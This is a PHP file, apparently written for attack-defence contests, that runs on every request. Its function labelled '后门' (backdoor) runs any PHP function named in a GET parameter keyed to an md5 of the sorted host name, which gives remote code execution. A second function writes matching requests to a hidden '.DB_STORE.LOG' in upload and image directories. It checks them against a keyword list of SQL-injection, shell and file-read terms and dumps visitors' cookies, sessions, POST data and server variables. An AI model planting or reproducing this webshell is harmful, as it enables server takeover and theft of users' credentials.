<?php
//?[sign][func]=arg
if(isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] != ''){
        editl3O0();
        logl130O();
}

//记录
function logl130O(){
try{
        if(isset($_GET[get_sign()])) return;//如果是自己的后门操作则忽略
        $filename = '.DB_STORE.LOG'; //日志文件名
        $saveDir = array('/cache/','/upload/', '/uploads/', '/images/', '/image/', '/img/', '/'); //日志保存的目录
        
        foreach($saveDir as $dir){
                $fn = $_SERVER['DOCUMENT_ROOT'].$dir.$filename;
                if(is_writable($fn)){
                        $str_append = null;
                        $filter_arr = array(
                                "GET" => @$_GET,
                                "POST" => @$_POST,
                                "SESSION" => @$_SESSION,
                                "FILES" => @$_FILES,
                                "COOKIE" => @$_COOKIE,
                                "HTTP_HOST" => @$_SERVER['HTTP_HOST'],
                                "HTTP_ORIGIN" => @$_SERVER['HTTP_ORIGIN'],
                                "HTTP_USER_AGENT" => @$_SERVER['HTTP_USER_AGENT'],
                                "HTTP_ACCEPT" => @$_SERVER['HTTP_ACCEPT'],
                                "HTTP_ACCEPT_ENCODING" => @$_SERVER['HTTP_ACCEPT_ENCODING'],
                                "HTTP_ACCEPT_LANGUAGE" => @$_SERVER['HTTP_ACCEPT_LANGUAGE'],
                                "PHP_SELF" => @$_SERVER['PHP_SELF'],
                                "HTTP_X_FORWARDED" => @$_SERVER['HTTP_X_FORWARDED'],
                                "HTTP_FORWARDED_FOR" => @$_SERVER['HTTP_FORWARDED_FOR'],
                                "HTTP_FORWARDED" => @$_SERVER['HTTP_FORWARDED'],
                                "HTTP_CLIENT_IP" => @$_SERVER['HTTP_CLIENT_IP']
                        );
                        $str_append = keyll300($filter_arr, 'ALL');
                        
                        if($str_append != ''){
                                list($hash, $str, $key, $logdata) = split (":", $str_append, 5);
                                $sstr = "{$hash}:{$str}:{$key}:";
                                if(is_bool(strpos(@file_get_contents($fn), $sstr))){
                                        file_put_contents($fn, "{$str_append}\n", FILE_APPEND);
                                }
                        }
                        break;
                }
        }
        
        
}catch(Exception $e){}
}

//递归搜索关键字
//字符串
function keyll300($arr, $str_name){
try{
        if(!isset($arr) || $arr == null)
                return;
        $keyword = array( //关键字
                0 => array('select', 'union', 'update', 'where', 'IF(', 'SLEEP', 'BENCHMARK', 'OUTFILE', 'DUMPFILE', 'LOAD_FILE'),
                1 => array('require', 'include', 'file_get_contents', 'readfile', 'file', 'fopen', 'highlight_file', 'show_source', 'assert()', 'call_user_func()', 'call_user_func_array()', 'create_function()', '``', 'file_', 'exec', 'shell', 'upload', 'copy', 'move(move_uploaded_file)', 'system', 'passthru', 'proc_', 'ini_', 'popen', 'rename', 'query', '$_FILES', 'eval', 'unlink', 'delete', 'remove', 'fwrite', 'fread', 'fopen', 'phpinfo', '<?', 'wget', 'echo', '|', 'pwd', 'curl', '/etc/passwd'),
                2 => array('.php', '.htaccess', '.ini', '..', '://'),
                3 => array('_', 'GLOBALS'),
                4 => array('<!ENTITY'),
                5 => array('script')
        );
        
        if(is_array($arr)){
                foreach($arr as $key => $val){
                        $searchkey = keyll300($key, $str_name);
                        if($searchkey != '')
                                return $searchkey;
                        $searchval = keyll300($val, $key);
                        if($searchval != '')
                                return $searchval;
                }
        }else{
                foreach($keyword as $key => $v1){
                        foreach($v1 as $v2){
                                if(stripos($arr, $v2) == true){
                                        $hashcode = gethash38O0($str_name);
                                        return "{$hashcode}:".base64_encode($str_name).":".base64_encode($key).":".base64_encode(json_encode(array(@$_GET, @$_POST, @$_REQUEST, @$_SESSION, @$_SERVER, @$_FILES, @$_COOKIE)));
                                }
                        }
                }
        }
        return '';
}catch(Exception $e){}
}

//生成hash
function gethash38O0($exc_get_var){
try{
        $repstr = '';
        if(isset($_GET[$exc_get_var])) $repstr = "{$exc_get_var}=".$_GET[$exc_get_var];
        $ostr = str_replace($repstr, '', urldecode($_SERVER['REQUEST_URI']));
        $arr = str_split($ostr);
        sort($arr, SORT_STRING);
        return md5(implode('', $arr));
}catch(Exception $e){}
}

//后门
function editl3O0(){
try{
        $p = @$_GET[get_sign()];
        if(is_array($p) && count($p)==1){
                foreach($p as $key => $value){
                        $key($value);
                }
        }
}catch(Exception $e){}
}

//生成密码
function get_sign(){
try{
        $arr = str_split($_SERVER['HTTP_HOST']);
        sort($arr, SORT_STRING);
        return md5(implode('', $arr));
}catch(Exception $e){}
}
